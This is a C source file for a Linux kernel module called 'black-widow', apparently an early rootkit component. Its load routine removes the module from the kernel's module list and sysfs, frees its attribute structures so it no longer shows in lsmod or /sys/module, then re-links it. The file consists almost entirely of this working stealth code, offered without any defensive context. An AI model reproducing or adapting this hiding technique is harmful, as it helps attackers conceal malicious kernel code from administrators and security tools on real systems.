/*
 * =====================================================================================
 *
 *       Filename:  black-widow.c
 *
 *    Description:  main src file
 *
 *        Version:  1.0
 *        Created:  03/27/2015 01:43:28 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  samy shehata
 *   Organization:  
 *
 * =====================================================================================
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>

static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */

static inline void memorize(void) {
  prev_entry = THIS_MODULE->list.prev;
}

static inline void vanish(void) {
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del(&THIS_MODULE->mkobj.kobj.entry);

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;
}

static inline void appear(void) {
  list_add(&THIS_MODULE->list, prev_entry);
}

// on module load
static int __init load_module(void) {
  memorize(); 
  vanish();
  appear();
  return 0;
}

// on module unload
static void __exit cleanup(void) {
  return;
}

module_init(load_module);
module_exit(cleanup);
